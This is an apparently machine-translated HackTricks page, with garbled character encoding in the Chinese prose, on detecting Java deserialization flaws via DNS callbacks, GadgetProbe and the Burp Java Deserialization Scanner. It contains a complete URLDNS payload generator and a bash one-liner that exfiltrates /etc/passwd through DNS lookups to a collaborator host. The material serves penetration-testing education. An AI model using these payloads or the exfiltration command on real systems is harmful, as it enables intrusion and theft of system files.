# Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ååºåˆ—åŒ–ä¸­çš„ DNS è¯·æ±‚

ç±» `java.net.URL` å®ç°äº† `Serializable`ï¼Œè¿™æ„å‘³ç€è¯¥ç±»å¯ä»¥è¢«åºåˆ—åŒ–ã€‚
```java
public final class URL implements java.io.Serializable {
```
è¿™ä¸ªç±»æœ‰ä¸€ä¸ª**å¥‡æ€ªçš„è¡Œä¸º**ã€‚æ ¹æ®æ–‡æ¡£ï¼šâ€œ**å¦‚æœä¸¤ä¸ªä¸»æœºåå¯ä»¥è§£æä¸ºç›¸åŒçš„IPåœ°å€ï¼Œåˆ™è¿™ä¸¤ä¸ªä¸»æœºè¢«è§†ä¸ºç­‰æ•ˆ**â€ã€‚\
å› æ­¤ï¼Œæ¯å½“ä¸€ä¸ªURLå¯¹è±¡è°ƒç”¨**ä»»ä½•**çš„**å‡½æ•°`equals`**æˆ–**`hashCode`**æ—¶ï¼Œéƒ½ä¼š**å‘é€**ä¸€ä¸ª**DNSè¯·æ±‚**ä»¥è·å–IPåœ°å€ã€‚

**ä»**ä¸€ä¸ª**URL**å¯¹è±¡è°ƒç”¨**`hashCode`**å‡½æ•°éå¸¸ç®€å•ï¼Œåªéœ€å°†è¯¥å¯¹è±¡æ’å…¥ä¸€ä¸ªå°†è¦è¢«ååºåˆ—åŒ–çš„`HashMap`ä¸­å³å¯ã€‚è¿™æ˜¯å› ä¸ºåœ¨`HashMap`çš„**`readObject`**å‡½æ•°çš„**æœ€å**ï¼Œä¼šæ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
å®ƒå°†**æ‰§è¡Œ** `putVal`ï¼Œä½¿ç”¨ `HashMap` ä¸­çš„æ¯ä¸ªå€¼ã€‚ä½†æ›´ç›¸å…³çš„æ˜¯å¯¹æ¯ä¸ªå€¼çš„ `hash` è°ƒç”¨ã€‚è¿™æ˜¯ `hash` å‡½æ•°çš„ä»£ç ï¼š
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
å¦‚æ‚¨æ‰€è§ï¼Œ**åœ¨ååºåˆ—åŒ–**ä¸€ä¸ª**`HashMap`**æ—¶ï¼Œå‡½æ•°`hash`å°†ä¼š**å¯¹æ¯ä¸ªå¯¹è±¡æ‰§è¡Œ**ï¼Œå¹¶ä¸”**åœ¨**`hash`æ‰§è¡ŒæœŸé—´**å°†ä¼šæ‰§è¡Œå¯¹è±¡çš„`.hashCode()`ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨**ååºåˆ—åŒ–**ä¸€ä¸ª**åŒ…å«**URLå¯¹è±¡çš„**`HashMap`**ï¼Œè¯¥**URLå¯¹è±¡**å°†ä¼š**æ‰§è¡Œ**`.hashCode()`ã€‚

ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹`URLObject.hashCode()`çš„ä»£ç ï¼š
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
å¦‚æ‚¨æ‰€è§ï¼Œå½“ `URLObject` æ‰§è¡Œ `.hashCode()` æ—¶ï¼Œå®ƒè¢«ç§°ä¸º `hashCode(this)`ã€‚æ¥ä¸‹æ¥ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°æ­¤å‡½æ•°çš„ä»£ç ï¼š
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
æ‚¨å¯ä»¥çœ‹åˆ°å¯¹åŸŸåæ‰§è¡Œäº† `getHostAddress`ï¼Œ**å‘èµ·äº† DNS æŸ¥è¯¢**ã€‚

å› æ­¤ï¼Œè¿™ä¸ªç±»å¯ä»¥è¢«**æ»¥ç”¨**ä»¥**å‘èµ·**ä¸€ä¸ª**DNS æŸ¥è¯¢**æ¥**è¯æ˜****ååºåˆ—åŒ–**æ˜¯å¯èƒ½çš„ï¼Œç”šè‡³å¯ä»¥**å¤–æ³„ä¿¡æ¯**ï¼ˆæ‚¨å¯ä»¥å°†å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºä½œä¸ºå­åŸŸåé™„åŠ ï¼‰ã€‚

### URLDNS è´Ÿè½½ä»£ç ç¤ºä¾‹

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ° [URDNS è´Ÿè½½ä»£ç æ¥è‡ª ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)ã€‚ä½†æ˜¯ï¼Œä¸ºäº†æ›´å®¹æ˜“ç†è§£å¦‚ä½•ç¼–ç ï¼Œæˆ‘åˆ›å»ºäº†è‡ªå·±çš„ PoCï¼ˆåŸºäº ysoserial çš„é‚£ä¸ªï¼‰ï¼š
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### æ›´å¤šä¿¡æ¯

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* åœ¨æœ€åˆçš„æƒ³æ³•ä¸­ï¼Œcommons collections è´Ÿè½½è¢«æ›´æ”¹ä¸ºæ‰§è¡Œ DNS æŸ¥è¯¢ï¼Œè¿™æ¯”æè®®çš„æ–¹æ³•ä¸å¤ªå¯é ï¼Œä½†è¿™æ˜¯å¸–å­ï¼š[https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

æ‚¨å¯ä»¥ä» Burp Suite åº”ç”¨å•†åº—ï¼ˆExtenderï¼‰ä¸‹è½½ [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe)ã€‚

**GadgetProbe** å°†å°è¯•ç¡®å®šæœåŠ¡å™¨çš„ Java ç±»ä¸­æ˜¯å¦å­˜åœ¨æŸäº› **Java ç±»**ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥çŸ¥é“ **æ˜¯å¦** å®ƒ **æ˜“å—** æŸäº›å·²çŸ¥æ¼æ´çš„æ”»å‡»ã€‚

### å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„

**GadgetProbe** å°†ä½¿ç”¨ä¸Šä¸€èŠ‚çš„ **DNS è´Ÿè½½**ï¼Œä½†åœ¨è¿è¡Œ DNS æŸ¥è¯¢ä¹‹å‰ï¼Œå®ƒå°† **å°è¯•ååºåˆ—åŒ–ä¸€ä¸ªä»»æ„ç±»**ã€‚å¦‚æœ **ä»»æ„ç±»å­˜åœ¨**ï¼Œåˆ™ **DNS æŸ¥è¯¢** å°†è¢« **å‘é€**ï¼ŒGadgetProbe å°†è®°å½•è¯¥ç±»å­˜åœ¨ã€‚å¦‚æœ **DNS** è¯·æ±‚ **ä»æœªå‘é€**ï¼Œè¿™æ„å‘³ç€ **ä»»æ„ç±»æœªæˆåŠŸååºåˆ—åŒ–**ï¼Œå› æ­¤å®ƒè¦ä¹ˆä¸å­˜åœ¨ï¼Œè¦ä¹ˆ **ä¸å¯åºåˆ—åŒ–/ä¸å¯åˆ©ç”¨**ã€‚

åœ¨ GitHub ä¸­ï¼Œ[**GadgetProbe æœ‰ä¸€äº›å­—å…¸**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) ç”¨äºæµ‹è¯•çš„ Java ç±»ã€‚

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1).gif>)

### æ›´å¤šä¿¡æ¯

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java ååºåˆ—åŒ–æ‰«æä»ª

æ­¤æ‰«æä»ªå¯ä»¥ä» Burp åº”ç”¨å•†åº—ï¼ˆ**Extender**ï¼‰**ä¸‹è½½**ã€‚\
è¯¥ **æ‰©å±•** å…·æœ‰ **è¢«åŠ¨** å’Œä¸»åŠ¨ **åŠŸèƒ½**ã€‚

### è¢«åŠ¨

é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼š **è¢«åŠ¨æ£€æŸ¥** æ‰€æœ‰è¯·æ±‚å’Œå“åº”ï¼Œ**å¯»æ‰¾** **Java åºåˆ—åŒ–é­”æœ¯å­—èŠ‚**ï¼Œå¦‚æœå‘ç°ä»»ä½•ï¼Œå°†å‘ˆç°æ¼æ´è­¦å‘Šï¼š

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (765).png>)

### ä¸»åŠ¨

**æ‰‹åŠ¨æµ‹è¯•**

æ‚¨å¯ä»¥é€‰æ‹©ä¸€ä¸ªè¯·æ±‚ï¼Œå³é”®å•å‡»å¹¶é€‰æ‹© `Send request to DS - Manual Testing`ã€‚\
ç„¶åï¼Œåœ¨ _Deserialization Scanner Tab_ --> _Manual testing tab_ ä¸­ï¼Œæ‚¨å¯ä»¥é€‰æ‹© **æ’å…¥ç‚¹**ã€‚å¹¶ **å¯åŠ¨æµ‹è¯•**ï¼ˆæ ¹æ®ä½¿ç”¨çš„ç¼–ç é€‰æ‹©é€‚å½“çš„æ”»å‡»ï¼‰ã€‚

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

å³ä½¿è¿™è¢«ç§°ä¸ºâ€œæ‰‹åŠ¨æµ‹è¯•â€ï¼Œå®ƒä¹Ÿç›¸å½“ **è‡ªåŠ¨åŒ–**ã€‚å®ƒå°†è‡ªåŠ¨æ£€æŸ¥ **ååºåˆ—åŒ–** æ˜¯å¦ **æ˜“å—** **ä»»ä½• ysoserial è´Ÿè½½** çš„æ”»å‡»ï¼Œæ£€æŸ¥ Web æœåŠ¡å™¨ä¸Šå­˜åœ¨çš„åº“ï¼Œå¹¶çªå‡ºæ˜¾ç¤ºæ˜“å—æ”»å‡»çš„åº“ã€‚ä¸ºäº† **æ£€æŸ¥** **æ˜“å—æ”»å‡»çš„åº“**ï¼Œæ‚¨å¯ä»¥é€‰æ‹©å¯åŠ¨ **Javas Sleeps**ã€é€šè¿‡ **CPU** æ¶ˆè€—çš„ **sleeps**ï¼Œæˆ–ä½¿ç”¨ **DNS**ï¼Œå¦‚å‰æ‰€è¿°ã€‚

**åˆ©ç”¨**

ä¸€æ—¦æ‚¨è¯†åˆ«å‡ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„åº“ï¼Œæ‚¨å¯ä»¥å°†è¯·æ±‚å‘é€åˆ° _Exploiting Tab_ã€‚\
åœ¨æ­¤é€‰é¡¹å¡ä¸­ï¼Œæ‚¨å¿…é¡»å†æ¬¡ **é€‰æ‹©** **æ³¨å…¥ç‚¹**ï¼Œå¹¶ **å†™å…¥** æ‚¨æƒ³è¦ä¸ºå…¶åˆ›å»ºè´Ÿè½½çš„ **æ˜“å—æ”»å‡»åº“** å’Œ **å‘½ä»¤**ã€‚ç„¶åï¼Œåªéœ€æŒ‰ä¸‹é€‚å½“çš„ **æ”»å‡»** æŒ‰é’®ã€‚

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/4.png)

### Java ååºåˆ—åŒ– DNS å¤–æ³„ä¿¡æ¯

ä½¿æ‚¨çš„è´Ÿè½½æ‰§è¡Œç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼š
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### æ›´å¤šä¿¡æ¯

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hackingï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hackingï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
